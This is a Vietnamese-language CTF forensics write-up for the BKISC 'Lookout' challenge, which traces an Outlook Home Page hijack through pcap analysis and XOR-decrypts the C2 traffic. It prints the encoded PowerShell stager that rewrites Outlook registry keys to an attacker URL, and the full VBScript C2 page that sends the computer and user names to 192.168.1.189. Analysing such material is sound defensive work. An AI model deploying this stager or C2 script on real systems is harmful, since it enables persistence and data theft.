---
author: NmToan
date: 2026-05-09T04:59:04.866Z
lastmod: 2026-05-09T00:00:00.000Z
title: Lookout BKISC
slug: Lookout-BKISC
featured: false
draft: false
tags:
  - Forensics
  - BKISC CTF
description: Write-up for the Lookout challenge on BKISC CTF, covering traffic analysis and reversing a Python script to decrypt C2 communications.
---

## Mô tả đề bài

> While checking a monthly report sent by one of my employees, everything seemed ordinary. However, when I logged back in my mailbox the next day, something strange was happening on my computer.

Challenge cho mình một file forensic image định dạng `.ad1`. Mục tiêu là lần theo dấu vết trong image này để hiểu chuyện gì đã xảy ra trên máy nạn nhân và cuối cùng khôi phục lại flag.

## Trích xuất dữ liệu từ file `.ad1`

Sau khi mở file `.ad1` bằng FTK Imager, mình thấy bên trong có một file `capture.pcapng`. Đây là dấu hiệu rất tốt vì với các bài forensic kiểu này, pcap thường cho mình thấy toàn bộ phần giao tiếp mạng của malware.

![pcap](/images/lookout/pcapinad.png)

## Tìm payload 

Mình mở `capture.pcapng` bằng Wireshark và lọc các request đáng chú ý. Dựa trên mô tả đề bài, mình thấy có một file `report.txt` được tải về nên mình export file này ra để phân tích.

![report.txt](/images/lookout/exportreport.png)

Nội dung `report.txt` như sau:

```powershell
Invoke-Command ([scriptblock]::Create([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JAB0AGUAbQBwAFIAZQBnAEYAaQBsAGUAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAFAAYQB0AGgAXQA6ADoARwBlAHQAVABlAG0AcABGAGkAbABlAE4AYQBtAGUAKAApACAAKwAgACIALgByAGUAZwAiAA0ACgANAAoAJAByAGUAZwBDAG8AbgB0AGUAbgB0ACAAPQAgAEAAIgANAAoAVwBpAG4AZABvAHcAcwAgAFIAZQBnAGkAcwB0AHIAeQAgAEUAZABpAHQAbwByACAAVgBlAHIAcwBpAG8AbgAgADUALgAwADAADQAKAA0ACgBbAEgASwBFAFkAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBcAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwATwBmAGYAaQBjAGUAXAAxADYALgAwAFwATwB1AHQAbABvAG8AawBcAFcAZQBiAHYAaQBlAHcAXABJAG4AYgBvAHgAXQANAAoAIgB1AHIAbAAiAD0AIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQA4ADkAOgA4ADMAOAA2AC8AcABsAHUAZwBpAG4ALwBzAGUAYQByAGMAaAAvACIADQAKACIAcwBlAGMAdQByAGkAdAB5ACIAPQAiAHkAZQBzACIADQAKAA0ACgBbAEgASwBFAFkAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBcAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwATwBmAGYAaQBjAGUAXAAxADUALgAwAFwATwB1AHQAbABvAG8AawBcAFcAZQBiAHYAaQBlAHcAXABJAG4AYgBvAHgAXQANAAoAIgB1AHIAbAAiAD0AIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQA4ADkAOgA4ADMAOAA2AC8AcABsAHUAZwBpAG4ALwBzAGUAYQByAGMAaAAvACIADQAKACIAcwBlAGMAdQByAGkAdAB5ACIAPQAiAHkAZQBzACIADQAKAA0ACgBbAEgASwBFAFkAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBcAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwATwBmAGYAaQBjAGUAXAAxADQALgAwAFwATwB1AHQAbABvAG8AawBcAFcAZQBiAHYAaQBlAHcAXABJAG4AYgBvAHgAXQANAAoAIgB1AHIAbAAiAD0AIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQA4ADkAOgA4ADMAOAA2AC8AcABsAHUAZwBpAG4ALwBzAGUAYQByAGMAaAAvACIADQAKACIAcwBlAGMAdQByAGkAdAB5ACIAPQAiAHkAZQBzACIADQAKAA0ACgBbAEgASwBFAFkAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBcAFMAbwBmAHQAdwBhAHIAZQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAEUAeAB0AFwAUwB0AGEAdABzAFwAewAyADYAMQBCADgAQwBBADkALQAzAEIAQQBGAC0ANABCAEQAMAAtAEIAMABDADIALQBCAEYAMAA0ADIAOAA2ADcAOAA1AEMANgB9AFwAaQBlAHgAcABsAG8AcgBlAF0ADQAKACIARgBsAGEAZwBzACIAPQBkAHcAbwByAGQAOgAwADAAMAAwADAAMAAwADQADQAKAA0ACgBbAEgASwBFAFkAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBcAFMAbwBmAHQAdwBhAHIAZQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAEkAbgB0AGUAcgBuAGUAdAAgAFMAZQB0AHQAaQBuAGcAcwBcAFoAbwBuAGUAcwBcADIAXQANAAoAIgAxADQAMABDACIAPQBkAHcAbwByAGQAOgAwADAAMAAwADAAMAAwADAADQAKACIAMQAyADAAMAAiAD0AZAB3AG8AcgBkADoAMAAwADAAMAAwADAAMAAwAA0ACgAiADEAMgAwADEAIgA9AGQAdwBvAHIAZAA6ADAAMAAwADAAMAAwADAAMwANAAoAIgBAAA0ACgANAAoAUwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJAB0AGUAbQBwAFIAZQBnAEYAaQBsAGUAIAAtAFYAYQBsAHUAZQAgACQAcgBlAGcAQwBvAG4AdABlAG4AdAAgAC0ARQBuAGMAbwBkAGkAbgBnACAAVQBuAGkAYwBvAGQAZQANAAoAJgAgAHIAZQBnAC4AZQB4AGUAIABpAG0AcABvAHIAdAAgACIAYAAiACQAdABlAG0AcABSAGUAZwBGAGkAbABlAGAAIgAiAA0ACgBSAGUAbQBvAHYAZQAtAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAkAHQAZQBtAHAAUgBlAGcARgBpAGwAZQAgAC0ARgBvAHIAYwBlAA0ACgA='))))
```

Đây là một đoạn PowerShell có phần nội dung chính được mã hóa Base64. Sau khi decode bằng CyberChef, mình thu được đoạn mã sau:

```powershell
$tempRegFile = [System.IO.Path]::GetTempFileName() + ".reg"

$regContent = @"
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Outlook\Webview\Inbox]
"url"="http://192.168.1.189:8386/plugin/search/"
"security"="yes"

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\15.0\Outlook\Webview\Inbox]
"url"="http://192.168.1.189:8386/plugin/search/"
"security"="yes"

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\14.0\Outlook\Webview\Inbox]
"url"="http://192.168.1.189:8386/plugin/search/"
"security"="yes"

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Ext\Stats\{261B8CA9-3BAF-4BD0-B0C2-BF04286785C6}\iexplore]
"Flags"=dword:00000004

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\2]
"140C"=dword:00000000
"1200"=dword:00000000
"1201"=dword:00000003
"@

Set-Content -Path $tempRegFile -Value $regContent -Encoding Unicode
& reg.exe import "`"$tempRegFile`""
Remove-Item -Path $tempRegFile -Force
```
Giải thích nhanh về đoạn mã này:

Đoạn script trên không tải thẳng malware dạng `.exe`. Thay vào đó, nó chỉnh registry để ép Outlook tải một trang web do attacker kiểm soát:

```text
http://192.168.1.189:8386/plugin/search/
```

Đây là kỹ thuật Outlook Home Page Hijacking, thường gặp trong framework Specula. Ý tưởng là:

1. attacker chỉnh URL WebView/Home Page của Outlook Inbox;
2. khi nạn nhân mở Outlook, Outlook sẽ tự load trang HTML từ server C2;
3. trang HTML đó chứa VBScript, và VBScript có thể tương tác với `window.external.OutlookApplication`;
4. từ đó attacker có thể dùng các COM object của Windows để đọc thông tin máy, gửi dữ liệu về server, và nhận lệnh tiếp theo.

Nói ngắn gọn, `report.txt` chính là stage đầu tiên dùng để thiết lập persistence và khởi tạo kênh C2 bên trong Outlook.

## Phân tích `tcp.stream eq 157`

Khi lọc theo IP `192.168.1.189` và follow các TCP stream liên quan, stream quan trọng đầu tiên là `tcp.stream eq 157`.
<details>
<summary> <code>tcp.stream eq 157</code></summary>

```
GET /plugin/search/ HTTP/1.1
Accept: */*
Accept-Language: en-GB
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Microsoft Outlook 16.0.18925)
Host: 192.168.1.189:8386
Connection: Keep-Alive

HTTP/1.1 200 OK
Server: Microsoft-IIS/8.5
Content-Type: text/html; charset=UTF-8
Date: Wed, 01 Oct 2025 01:14:30 GMT
Etag: "8646f5e2ef9147e9bf57b0632d206f94af957e55"
Content-Length: 3010

<html>
<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta http-equiv="refresh" content="10">
<meta http-equiv="Cache-Control" content=NO-CACHE, no-store, must-revalidate, max-age=0" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="EXPIRES" CONTENT="0">
<title>Outlook</title>
<style>
body {
overflow: hidden;
border: 0px;
padding: 0px;
margin: 0px;
}
</style>
<script id=clientEventHandlersVBS language=vbscript>
<!--
On Error Resume Next
Function GetEnvironment()
On Error Resume Next
Set sh = outlookapp.CreateObject("Wscript.Shell")
compname = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
usern = sh.ExpandEnvironmentStrings("%USERNAME%")
r = BaseDecode(compname & "|" & usern,1)
GetEnvironment = r
End Function
Function SetRegKey(subkey,value,valuetype)
On Error Resume Next
Set oL = outlookapp.CreateObject("Wscript.Shell")
ol.RegWrite subkey, value, valuetype
End Function
Function BaseDecode(value, LE)
On Error Resume Next
With outlookapp.CreateObject("Msxml2.DOMDocument").CreateElement("aux")
.DataType = "bin.base64"
if LE then
.NodeTypedValue = StrToBytes(value, "utf-16le", 2)
else
.NodeTypedValue = StrToBytes(value, "utf-8", 3)
end if
BaseDecode = .Text
End With
End Function
Function requestpage(uri, rR)
On Error Resume Next
vi = Left(outlookapp.version,4)
d = rR
set oP = outlookapp.CreateObject("MSXML2.ServerXMLHTTP")
oP.open "POST", uri,false
oP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
oP.setRequestHeader "Content-Length", Len(d)
oP.setRequestHeader "User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook " & vi
oP.setOption 2, 13056
oP.send Replace(d, vbLf, "")
requestpage = oP.responseText
End Function
Function StrToBytes(strn, cset, pos)
On Error Resume Next
With outlookapp.CreateObject("ADODB.Stream")
.Type = 2
.Charset = cset
.Open
.WriteText strn
.Position = 0
.Type = 1
.Position = pos
StrToBytes = .Read
.Close
End With
End function
O = ""
uriloc = "http://192.168.1.189:8386/plugin/search/"
Set outlookapp = window.external.OutlookApplication
Sub window_onload()
O = GetEnvironment()
rul = requestpage(uriloc, chr(34) & O & chr(34))
if not rul = "" Then
Set box = outlookapp.GetNameSpace("MAPI")
Set fold = box.GetDefaultFolder(9)
val1 = SetRegKey("HKCU\" & "Software\Microsoft\Office\"  & Left(outlookapp.version,4) & "\Outlook\UserInfo" & "\" & "KEY", Split(rul,"||")(0), "REG_SZ")
val2 = SetRegKey("HKCU\Software\Microsoft\Office\" & Left(outlookapp.version,4) & "\Outlook\Webview\Inbox\URL", Split(rul,"||")(1), "REG_SZ")
val3 = SetRegKey("HKCU\Software\Microsoft\Internet Explorer\Styles\MaxScriptStatements", &Hffffffff, "REG_DWORD")
Set outlookapp.ActiveExplorer.CurrentFolder = fold
End if
End Sub
-->
</script>
</head>
<body>
<object classid="CLSID:0006F063-0000-0000-C000-000000000046" id="SpeculaViewID" data="" width="100%" height="100%"></object>
</body>
</html>
GET /plugin/search/ HTTP/1.1
Accept: */*
Accept-Language: en-GB
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Microsoft Outlook 16.0.18925)
Host: 192.168.1.189:8386
If-None-Match: "8646f5e2ef9147e9bf57b0632d206f94af957e55"
Connection: Keep-Alive

HTTP/1.1 304 Not Modified
Server: Microsoft-IIS/8.5
Date: Wed, 01 Oct 2025 01:14:41 GMT
Etag: "8646f5e2ef9147e9bf57b0632d206f94af957e55"

GET /plugin/search/ HTTP/1.1
Accept: */*
Accept-Language: en-GB
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Microsoft Outlook 16.0.18925)
Host: 192.168.1.189:8386
If-None-Match: "8646f5e2ef9147e9bf57b0632d206f94af957e55"
Connection: Keep-Alive

HTTP/1.1 304 Not Modified
Server: Microsoft-IIS/8.5
Date: Wed, 01 Oct 2025 01:14:51 GMT
Etag: "8646f5e2ef9147e9bf57b0632d206f94af957e55"

GET /plugin/search/ HTTP/1.1
Accept: */*
Accept-Language: en-GB
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Microsoft Outlook 16.0.18925)
Host: 192.168.1.189:8386
If-None-Match: "8646f5e2ef9147e9bf57b0632d206f94af957e55"
Connection: Keep-Alive

HTTP/1.1 304 Not Modified
Server: Microsoft-IIS/8.5
Date: Wed, 01 Oct 2025 01:15:01 GMT
Etag: "8646f5e2ef9147e9bf57b0632d206f94af957e55"

GET /plugin/search/ HTTP/1.1
Accept: */*
Accept-Language: en-GB
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Microsoft Outlook 16.0.18925)
Host: 192.168.1.189:8386
If-None-Match: "8646f5e2ef9147e9bf57b0632d206f94af957e55"
Connection: Keep-Alive

HTTP/1.1 304 Not Modified
Server: Microsoft-IIS/8.5
Date: Wed, 01 Oct 2025 01:15:11 GMT
Etag: "8646f5e2ef9147e9bf57b0632d206f94af957e55"

```

</details>

Nó cho thấy Outlook gửi request:

```http
GET /plugin/search/ HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Microsoft Outlook 16.0.18925)
Host: 192.168.1.189:8386
```

Server trả về một trang HTML chứa VBScript. Điểm quan trọng nhất trong đoạn VBScript này là:

```vbscript
Set outlookapp = window.external.OutlookApplication
```

và các hàm như:

- `GetEnvironment()`
- `requestpage(uri, rR)`
- `SetRegKey(subkey, value, valuetype)`
- `StrToBytes(...)`
- `BaseDecode(...)`

Điều này cho thấy script đang chạy trực tiếp trong context của Outlook và có thể tạo COM object như:

- `Wscript.Shell`
- `MSXML2.ServerXMLHTTP`
- `ADODB.Stream`

Từ VBScript, có thể suy ra chuỗi hành vi như sau:

1. Lấy `COMPUTERNAME` và `USERNAME`.
2. Ghép lại thành `COMPUTERNAME|USERNAME`.
3. Mã hóa chuỗi đó thành Base64.
4. Gửi về `/plugin/search/` bằng HTTP POST.
5. Nhận response từ server.
6. Ghi response này vào registry để tiếp tục duy trì WebView độc hại trong Outlook.

Ngoài ra, HTML còn có:

```html
<meta http-equiv="refresh" content="10">
```

Nên Outlook sẽ refresh trang định kỳ mỗi 10 giây. Điều này giải thích vì sao cùng một endpoint `/plugin/search/` xuất hiện lặp đi lặp lại trong pcap.

<details>
<summary>Giải thích ngắn về kỹ thuật trong <code>tcp.stream eq 157</code></summary>

Đây là kỹ thuật Outlook Home Page Hijacking kết hợp với VBScript-based C2.

- Outlook bị ép tải một trang HTML từ server attacker.
- Trang HTML chạy VBScript thông qua `window.external.OutlookApplication`.
- VBScript sử dụng COM object để giao tiếp HTTP và ghi registry.
- Nhờ vậy, attacker có thể điều khiển nạn nhân mà không cần thả thêm một file PE truyền thống.

</details>


##  Phân tích `tcp.stream eq 159`

Stream tiếp theo là `tcp.stream eq 159`, nơi Outlook thực hiện các request `POST /plugin/search/`.
<details>
<summary> <code>tcp.stream eq 159</code></summary>

```http
POST /plugin/search/ HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Accept: */*
Accept-Language: en-gb
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook 16.0
Content-Length: 42
Host: 192.168.1.189:8386

"QwBPAE0ATQBBAE4ARABPAHwAQgBLAEkAUwBDAA=="
HTTP/1.1 200 OK
Server: Microsoft-IIS/8.5
Content-Type: text/html; charset=UTF-8
Date: Wed, 01 Oct 2025 01:14:31 GMT
Content-Length: 0


POST /plugin/search/ HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Accept: */*
Accept-Language: en-gb
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook 16.0
Content-Length: 42
Host: 192.168.1.189:8386

"QwBPAE0ATQBBAE4ARABPAHwAQgBLAEkAUwBDAA=="
HTTP/1.1 200 OK
Server: Microsoft-IIS/8.5
Content-Type: text/html; charset=UTF-8
Date: Wed, 01 Oct 2025 01:14:41 GMT
Content-Length: 0


POST /plugin/search/ HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Accept: */*
Accept-Language: en-gb
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook 16.0
Content-Length: 42
Host: 192.168.1.189:8386

"QwBPAE0ATQBBAE4ARABPAHwAQgBLAEkAUwBDAA=="
HTTP/1.1 200 OK
Server: Microsoft-IIS/8.5
Content-Type: text/html; charset=UTF-8
Date: Wed, 01 Oct 2025 01:14:51 GMT
Content-Length: 0


POST /plugin/search/ HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Accept: */*
Accept-Language: en-gb
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook 16.0
Content-Length: 42
Host: 192.168.1.189:8386

"QwBPAE0ATQBBAE4ARABPAHwAQgBLAEkAUwBDAA=="
HTTP/1.1 200 OK
Server: Microsoft-IIS/8.5
Content-Type: text/html; charset=UTF-8
Date: Wed, 01 Oct 2025 01:15:01 GMT
Content-Length: 0


POST /plugin/search/ HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Accept: */*
Accept-Language: en-gb
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook 16.0
Content-Length: 42
Host: 192.168.1.189:8386

"QwBPAE0ATQBBAE4ARABPAHwAQgBLAEkAUwBDAA=="
HTTP/1.1 200 OK
Server: Microsoft-IIS/8.5
Content-Type: text/html; charset=UTF-8
Date: Wed, 01 Oct 2025 01:15:11 GMT
Content-Length: 68

o4WlfbKbx1xik1TgTQGeOQ||http://192.168.1.189:8386/css/dx7u7QYCSlbTbQ
```

</details>

Payload gửi đi có dạng:

```http
"QwBPAE0ATQBBAE4ARABPAHwAQgBLAEkAUwBDAA=="
```

Chuỗi này khi decode Base64 dưới dạng UTF-16LE sẽ ra:

```text
COMMANDO|BKISC
```

Điều này khớp hoàn toàn với logic trong VBScript ở bước trước: malware lấy `COMPUTERNAME|USERNAME`, encode thành Base64, rồi gửi về C2 như một thông điệp check-in.

Điểm quan trọng nhất của stream này là response cuối cùng của server:

```text
o4WlfbKbx1xik1TgTQGeOQ||http://192.168.1.189:8386/css/dx7u7QYCSlbTbQ
```

Chuỗi trên có thể tách làm 2 phần:

1. `o4WlfbKbx1xik1TgTQGeOQ`
2. `http://192.168.1.189:8386/css/dx7u7QYCSlbTbQ`

Từ đoạn VBScript, ta biết rằng malware sẽ dùng:

- phần đầu làm session token / key XOR;
- phần sau làm URL tiếp theo mà Outlook sẽ giao tiếp.

Đây chính là manh mối quan trọng để giải mã traffic ở bước sau.

<details>
<summary>Giải thích ngắn về <code>tcp.stream eq 159</code></summary>

Stream này cho thấy giai đoạn check-in hoàn chỉnh:

- nạn nhân gửi `COMPUTERNAME|USERNAME` đã được Base64-encode;
- server trả về một token phiên làm việc và URL C2 mới;
- token này sau đó được dùng làm key cho cơ chế XOR trong phần traffic tiếp theo.

</details>



## Tìm cơ chế mã hóa của traffic C2

Từ phần VBScript ở stream 157, mình thấy có hàm `Crypt()` với logic rất quan trọng:

```vbscript
cptx = CByte("&H" & Mid(input, i * 2 - 1, 2))
orgx = cptx Xor keyx
z = z & Chr(orgx)
```

Điều đó có nghĩa là traffic về sau không dùng RC4 hay AES ở lớp C2, mà chỉ dùng:

1. dữ liệu plaintext;
2. XOR với từng byte của key theo kiểu rolling key;
3. chuyển kết quả sang hex để gửi đi.

Nói cách khác:

```text
plaintext -> XOR với session key -> hex encode -> gửi qua HTTP POST
```

Session key chính là:

```text
o4WlfbKbx1xik1TgTQGeOQ
```

## Bước 7: Trích payload từ pcap và giải mã

Lúc này hướng làm rõ ràng nhất là:

1. trích các payload hex từ `capture.pcapng`;
2. dùng session key để XOR-decrypt các payload đó.

Mình dùng 2 script:

- `extract_pcap_payloads.py`: trích payload từ pcap;

```python
import argparse
import re
from pathlib import Path

DEFAULT_PCAP = "capture.pcapng"
DEFAULT_OUT = "step4_payloads.txt"
DEFAULT_KEY_OUT = "step4_key.txt"


def extract_session_key(data: bytes) -> str | None:
    match = re.search(
        rb"([A-Za-z0-9]{16,})\|\|http://[0-9.]+:[0-9]+/css/[A-Za-z0-9]+",
        data,
    )
    if not match:
        return None
    return match.group(1).decode("ascii")


def extract_payloads(data: bytes) -> list[tuple[int, str]]:
    seen = set()
    results = []
    post_pattern = re.compile(rb"POST /css/[^\x20]+ HTTP/1\.1")
    hex_pattern = re.compile(rb'"([0-9A-Fa-f]{20,})"')

    for match in post_pattern.finditer(data):
        start = match.start()
        chunk = data[start:start + 4000]
        payloads = hex_pattern.findall(chunk)
        for payload in payloads:
            hex_str = payload.decode("ascii")
            if hex_str in seen:
                continue
            seen.add(hex_str)
            results.append((start, hex_str))

    return results


def write_payload_file(path: str, payloads: list[tuple[int, str]]) -> None:
    lines = [
        "# offset<TAB>payload_hex",
        *[f"{offset}\t{hex_str}" for offset, hex_str in payloads],
        "",
    ]
    Path(path).write_text("\n".join(lines), encoding="utf-8")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Extract Specula HTTP POST payloads from a pcap/pcapng file."
    )
    parser.add_argument(
        "--pcap",
        default=DEFAULT_PCAP,
        help=f"Path to pcap/pcapng file (default: {DEFAULT_PCAP}).",
    )
    parser.add_argument(
        "--out",
        default=DEFAULT_OUT,
        help=f"Where to write extracted payloads (default: {DEFAULT_OUT}).",
    )
    parser.add_argument(
        "--key-out",
        default=DEFAULT_KEY_OUT,
        help=f"Where to write the extracted session key (default: {DEFAULT_KEY_OUT}).",
    )
    args = parser.parse_args()

    data = Path(args.pcap).read_bytes()
    key = extract_session_key(data)
    payloads = extract_payloads(data)

    write_payload_file(args.out, payloads)

    if key:
        Path(args.key_out).write_text(key + "\n", encoding="utf-8")
        print(f"[+] session key: {key}")
        print(f"[+] key saved to: {args.key_out}")
    else:
        print("[!] session key not found")

    print(f"[+] payloads found: {len(payloads)}")
    print(f"[+] payloads saved to: {args.out}")


if __name__ == "__main__":
    main()

```

- `step4_decrypt.py`: giải mã các payload đã trích được.

```python
import argparse
import mmap
import re
import sys
from pathlib import Path

KEY = "o4WlfbKbx1xik1TgTQGeOQ"


def xor_decrypt_hex(data_hex: str, key: str = KEY) -> bytes:
    data = bytes.fromhex(data_hex)
    key_bytes = key.encode("ascii")
    return bytes(b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data))


def decrypt_from_dump(path: str, key: str = KEY) -> None:
    seen = set()
    pattern = rb'POST /css/[^\x20]+ HTTP/1\.1'
    hex_pattern = re.compile(rb'"([0-9A-Fa-f]{20,})"')

    with open(path, "rb") as f:
        mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
        for match in re.finditer(pattern, mm):
            start = match.start()
            chunk = mm[start:start + 4000]
            payloads = hex_pattern.findall(chunk)

            for payload in payloads:
                hex_str = payload.decode("ascii")
                if hex_str in seen:
                    continue
                seen.add(hex_str)

                decrypted = xor_decrypt_hex(hex_str, key)
                text = decrypted.decode("utf-8", errors="replace")
                output = f"{text}\n"
                sys.stdout.buffer.write(output.encode("utf-8", errors="replace"))


def decrypt_from_payload_file(path: str, key: str = KEY) -> None:
    for line_number, raw_line in enumerate(
        Path(path).read_text(encoding="utf-8").splitlines(),
        start=1,
    ):
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue

        hex_str = line
        if "\t" in line:
            _, hex_str = line.split("\t", 1)

        decrypted = xor_decrypt_hex(hex_str, key)
        text = decrypted.decode("utf-8", errors="replace")
        output = f"{text}\n"
        sys.stdout.buffer.write(output.encode("utf-8", errors="replace"))


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Decrypt Specula/Outlook C2 payloads from step 4."
    )
    parser.add_argument(
        "--hex",
        dest="hex_value",
        help="Decrypt one hex payload directly.",
    )
    parser.add_argument(
        "--dump",
        help="Path to dump.bin for scanning POST payloads.",
    )
    parser.add_argument(
        "--payload-file",
        help="Path to a text file generated by extract_pcap_payloads.py.",
    )
    parser.add_argument(
        "--key",
        default=KEY,
        help=f"XOR key/session token (default: {KEY}).",
    )
    args = parser.parse_args()

    if args.hex_value:
        decrypted = xor_decrypt_hex(args.hex_value, args.key)
        output = decrypted.decode("utf-8", errors="replace") + "\n"
        sys.stdout.buffer.write(output.encode("utf-8", errors="replace"))
        return

    if args.payload_file:
        decrypt_from_payload_file(args.payload_file, args.key)
        return

    if args.dump:
        decrypt_from_dump(args.dump, args.key)
        return

    parser.error("use --hex, --payload-file, or --dump")


if __name__ == "__main__":
    main()

```

Chạy 2 script này với command:

```bash
python extract_pcap_payloads.py --pcap capture.pcapng
python step4_decrypt.py --payload-file step4_payloads.txt --key o4WlfbKbx1xik1TgTQGeOQ
```

Hàm giải mã cốt lõi:

```python
def xor_decrypt_hex(data_hex, key):
    data = bytes.fromhex(data_hex)
    key_bytes = key.encode("ascii")
    return bytes(b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data))
```

Giải thích:

- `bytes.fromhex(...)` chuyển chuỗi hex về dạng bytes;
- `key.encode("ascii")` chuyển session key thành bytes;
- `i % len(key_bytes)` mô phỏng rolling-key XOR như trong VBScript;
- mỗi byte ciphertext sẽ XOR với một byte của key để ra plaintext.

### Kết quả sau khi giải mã

Sau khi giải mã, mình thu được 6 payload chính. Trong đó:

- 4 payload ra text có ý nghĩa;
- 2 payload ra dữ liệu khó đọc, nhiều khả năng là control message hoặc fragment không dùng để hiển thị như text thuần.

```
PS D:\CTF\BK\lookout> python step4_decrypt.py --payload-file step4_payloads.txt --key o4WlfbKbx1xik1TgTQGeOQ 
Parent Folder: C:/Users
F: C:\Users\desktop.ini - Size: 0mb - LastModified: 07/12/2019 10:12:42
D: C:\Users\All Users - LastModified: 07/12/2019 10:30:39
D: C:\Users\BKISC - LastModified: 31/07/2025 11:53:48
D: C:\Users\Default - LastModified: 23/07/2025 16:24:11
D: C:\Users\Default User - LastModified: 07/12/2019 10:30:39
D: C:\Users\Public - LastModified: 07/04/2024 19:05:48

�.�91`л����Wv��
Parent Folder: C:/Users/BKISC/Desktop
F: C:\Users\BKISC\Desktop\desktop.ini - Size: 0mb - LastModified: 07/04/2024 19:05:48
F: C:\Users\BKISC\Desktop\flag.py - Size: 0mb - LastModified: 25/07/2025 15:41:41
F: C:\Users\BKISC\Desktop\Obsidian.lnk - Size: 0mb - LastModified: 08/04/2024 08:05:44
F: C:\Users\BKISC\Desktop\Tor Browser.lnk - Size: 0mb - LastModified: 08/04/2024 08:41:37
D: C:\Users\BKISC\Desktop\PS_Transcripts - LastModified: 01/10/2025 02:11:40

��-"p���ݛZ�gT�
# Just run the code to get the flag lol

def RC4(key : bytes, plaintext : bytes):
    S = list(range(256))
    j = 0

    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]  

    i = j = 0
    ciphertext = []
    for char in plaintext:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]  
        t = (S[i] + S[j]) % 256
        k = S[t]
        ciphertext.append(char ^ k)

    return bytes(ciphertext)

key = b"lookalikechicken"
plaintext = b';fa\x98\xc9\x13\xc8\x89\xda\x04\xed\xb6\x19\x98\xfdgF-\x14S\xa8+\xf50\xc4p\xf90\xb2&j\x081'
print(RC4(key, plaintext).decode())
Delete file: C:\Users\BKISC\Desktop\flag.py - Success!
PS D:\CTF\BK\lookout> 
```
Các payload quan trọng như sau.

### Payload 1: Liệt kê thư mục `C:\Users`

```text
Parent Folder: C:/Users
F: C:\Users\desktop.ini - Size: 0mb - LastModified: 07/12/2019 10:12:42
D: C:\Users\All Users - LastModified: 07/12/2019 10:30:39
D: C:\Users\BKISC - LastModified: 31/07/2025 11:53:48
D: C:\Users\Default - LastModified: 23/07/2025 16:24:11
D: C:\Users\Default User - LastModified: 07/12/2019 10:30:39
